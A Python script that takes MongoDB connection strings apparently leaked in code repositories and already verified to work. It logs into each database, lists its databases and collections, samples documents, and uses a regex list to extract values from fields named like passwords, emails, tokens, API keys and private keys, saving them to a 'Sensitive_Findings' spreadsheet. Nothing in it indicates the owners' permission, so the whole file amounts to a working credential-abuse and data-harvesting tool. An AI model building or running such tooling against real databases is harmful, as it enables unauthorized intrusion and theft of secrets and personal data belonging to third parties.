import pandas as pd
import json
import time
import os
import re
from bson import ObjectId
from pymongo import MongoClient
from pymongo.errors import PyMongoError
from urllib.parse import urlparse, unquote

# --- CONFIGURATION ---
OUTPUT_EXCEL = "db_exploration_results.xlsx"
LOOKUP_CSV = "verified_credentials.csv"
FINDINGS_CSV = "findings_annotated.csv"

class MongoEncoder(json.JSONEncoder):
    """Custom JSON encoder to handle MongoDB-specific types."""
    def default(self, obj):
        if isinstance(obj, ObjectId):
            return str(obj)
        if isinstance(obj, bytes):
            return obj.decode('utf-8', errors='ignore')
        return super(MongoEncoder, self).default(obj)

def flatten_document(doc, parent_key='', sep='.'):
    """
    Flatten a nested MongoDB document into a single-level dictionary.
    Example: {'a': {'b': 1}} becomes {'a.b': 1}
    """
    items = []
    for k, v in doc.items():
        new_key = f"{parent_key}{sep}{k}" if parent_key else k
        if isinstance(v, dict):
            items.extend(flatten_document(v, new_key, sep=sep).items())
        elif isinstance(v, list):
            # Convert lists to JSON strings for Excel compatibility
            items.append((new_key, json.dumps(v, default=MongoEncoder().default)))
        else:
            items.append((new_key, v))
    return dict(items)

def extract_sensitive_fields(flat_doc, conn_string, db_name, coll_name):
    """
    Identifies fields in a flattened document that look like sensitive data.
    """
    findings = []
    sensitive_patterns = [
        r'password', r'pass', r'pwd',
        r'email', r'mail',
        r'token', r'auth', r'secret',
        r'api[_-]?key', r'apikey',
        r'private[_-]?key', r'certificate'
    ]
    
    for k, v in flat_doc.items():
        if isinstance(v, str) and v:
            if any(re.search(pattern, k, re.IGNORECASE) for pattern in sensitive_patterns):
                findings.append({
                    "Connection_String": conn_string,
                    "Database": db_name,
                    "Collection": coll_name,
                    "Field_Name": k,
                    "Value_Preview": v[:100] + "..." if len(v) > 100 else v,
                    "Value_Length": len(v)
                })
    return findings

def load_explored_connections(lookup_file=OUTPUT_EXCEL):
    """Load already explored connection strings from the Excel file."""
    explored = set()
    if os.path.exists(lookup_file):
        try:
            # Read only the Summary sheet to get connection strings
            xls = pd.ExcelFile(lookup_file)
            if 'Summary' in xls.sheet_names:
                summary_df = pd.read_excel(lookup_file, sheet_name='Summary')
                if 'Connection_String' in summary_df.columns:
                    explored = set(summary_df['Connection_String'].dropna())
        except Exception as e:
            print(f"Warning: Could not read existing Excel file: {e}")
    return explored

def safe_explore_connection_string(conn_string, db_name=None, summary_rows=None, sample_rows=None, sensitive_rows=None):
    """
    Explores a single MongoDB connection string and appends results to in-memory lists.
    """
    print(f"\n{'='*50}")
    print(f"EXPLORING: {conn_string[:50]}...")
    print(f"{'='*50}")
    
    # Initialize summary row
    summary_row = {
        "Connection_String": conn_string,
        "Timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "Status": "PENDING",
        "Databases": "",
        "Collections": "",
        "Error": None
    }
    
    try:
        client = MongoClient(conn_string, serverSelectionTimeoutMS=5000, connectTimeoutMS=5000)
        client.admin.command('ping')
        
        # List databases
        dbs = client.list_database_names()
        summary_row["Databases"] = ", ".join(dbs)
        print(f"Databases: {dbs}")
        
        # If a specific db is provided, use it. Otherwise, use the first non-admin/local db.
        target_db_name = db_name
        if not target_db_name:
            for db in dbs:
                if db not in ['admin', 'local', 'config']:
                    target_db_name = db
                    break
        
        if not target_db_name:
            summary_row["Status"] = "NO_TARGET_DB"
            print("No target database found.")
            return summary_row, sample_rows, sensitive_rows
        
        db = client[target_db_name]
        collections = db.list_collection_names()
        summary_row["Collections"] = ", ".join(collections)
        summary_row["Status"] = "SUCCESS"
        print(f"Collections in '{target_db_name}': {collections}")
        
        for coll_name in collections:
            collection = db[coll_name]
            print(f"\n--- {coll_name} ---")
            
            # Use a timeout for count to avoid hanging on huge collections
            try:
                count = collection.count_documents({}, maxTimeMS=5000)
                print(f"Total Documents: {count}")
            except Exception:
                count = "Unknown (timeout)"
                print(f"Total Documents: {count}")
            
            # Sample 3 documents
            for doc in collection.find().limit(3):
                # Flatten the document
                flat_doc = flatten_document(doc)
                
                # Add metadata to the flattened doc
                flat_doc["Connection_String"] = conn_string
                flat_doc["Database"] = target_db_name
                flat_doc["Collection"] = coll_name
                flat_doc["Doc_Count"] = count
                
                # Append to sample rows
                sample_rows.append(flat_doc)
                
                # Extract sensitive fields
                sensitive = extract_sensitive_fields(flat_doc, conn_string, target_db_name, coll_name)
                if sensitive:
                    sensitive_rows.extend(sensitive)
                
                # Print to console
                print(json.dumps(flat_doc, indent=2, default=MongoEncoder().default))
        
        client.close()
        
    except PyMongoError as e:
        error_msg = str(e)
        print(f"Exploration failed: {error_msg}")
        summary_row["Status"] = "FAILED"
        summary_row["Error"] = error_msg
    except Exception as e:
        error_msg = str(e)
        print(f"Unexpected error: {e}")
        summary_row["Status"] = "ERROR"
        summary_row["Error"] = error_msg
        
    return summary_row, sample_rows, sensitive_rows

def save_to_excel(summary_rows, sample_rows, sensitive_rows, output_file=OUTPUT_EXCEL):
    """
    Saves all results to a single Excel file with multiple sheets.
    """
    if not summary_rows:
        print("No results to save.")
        return

    summary_df = pd.DataFrame(summary_rows)
    
    # Ensure consistent column order for Summary
    summary_cols = ["Connection_String", "Timestamp", "Status", "Databases", "Collections", "Error"]
    summary_df = summary_df.reindex(columns=summary_cols)
    
    sample_df = pd.DataFrame(sample_rows)
    sensitive_df = pd.DataFrame(sensitive_rows)
    
    # If no sensitive findings, create an empty DataFrame with correct columns
    if sensitive_df.empty:
        sensitive_df = pd.DataFrame(columns=["Connection_String", "Database", "Collection", "Field_Name", "Value_Preview", "Value_Length"])
    
    with pd.ExcelWriter(output_file, engine='openpyxl') as writer:
        summary_df.to_excel(writer, sheet_name='Summary', index=False)
        sample_df.to_excel(writer, sheet_name='Samples', index=False)
        sensitive_df.to_excel(writer, sheet_name='Sensitive_Findings', index=False)
        
        # Auto-adjust column widths for better readability
        for sheet_name in writer.sheets:
            worksheet = writer.sheets[sheet_name]
            for column_cells in worksheet.columns:
                max_length = 0
                column = column_cells[0].column_letter
                for cell in column_cells:
                    try:
                        if len(str(cell.value)) > max_length:
                            max_length = len(str(cell.value))
                    except:
                        pass
                adjusted_width = min(max_length + 2, 50)  # Cap width at 50
                worksheet.column_dimensions[column].width = adjusted_width

    print(f"\n[SUCCESS] Results saved to {output_file}")
    print(f"  - Summary: {len(summary_df)} rows")
    print(f"  - Samples: {len(sample_df)} rows")
    print(f"  - Sensitive Findings: {len(sensitive_df)} rows")

if __name__ == "__main__":
    # 1. Load the verification results
    try:
        results_df = pd.read_csv(LOOKUP_CSV)
    except FileNotFoundError:
        print(f"Error: {LOOKUP_CSV} not found. Run db_tester.py first.")
        exit(1)
    
    # 2. Load the original findings (which contain source_secret)
    try:
        findings_df = pd.read_csv(FINDINGS_CSV)
    except FileNotFoundError:
        print(f"Error: {FINDINGS_CSV} not found. Run prepare_findings.py first.")
        exit(1)
    
    # 3. Filter for SUCCESS
    success_df = results_df[results_df['status'] == 'SUCCESS']
    
    if success_df.empty:
        print("No successful connections found in verified_credentials.csv.")
        exit(0)
    
    # 4. Merge with findings to get source_secret
    merged_df = pd.merge(
        success_df, 
        findings_df[['repo', 'file', 'line', 'source_secret']], 
        on=['repo', 'file', 'line'], 
        how='left'
    )
    
    # Drop rows where source_secret is missing
    merged_df = merged_df.dropna(subset=['source_secret'])
    
    # Deduplicate based on source_secret
    merged_df = merged_df.drop_duplicates(subset=['source_secret'])
    
    if merged_df.empty:
        print("No valid connections to explore after merging and deduplication.")
        exit(0)
    
    # 5. Load already explored connections
    explored_conns = load_explored_connections()
    
    # 6. Filter out already explored connections
    to_explore = merged_df[~merged_df['source_secret'].isin(explored_conns)]
    
    if to_explore.empty:
        print("All successful connections have already been explored.")
        exit(0)
    
    print(f"Found {len(to_explore)} new successful connections to explore.")
    
    # 7. Initialize lists to collect results
    summary_rows = []
    sample_rows = []
    sensitive_rows = []
    
    # 8. Explore each connection
    for _, row in to_explore.iterrows():
        conn_string = row['source_secret']
        s_row, smp_rows, sens_rows = safe_explore_connection_string(
            conn_string, 
            summary_rows=summary_rows, 
            sample_rows=sample_rows, 
            sensitive_rows=sensitive_rows
        )
        summary_rows.append(s_row)
        # Small delay to avoid overwhelming the server
        time.sleep(1)
    
    # 9. Save to Excel
    save_to_excel(summary_rows, sample_rows, sensitive_rows)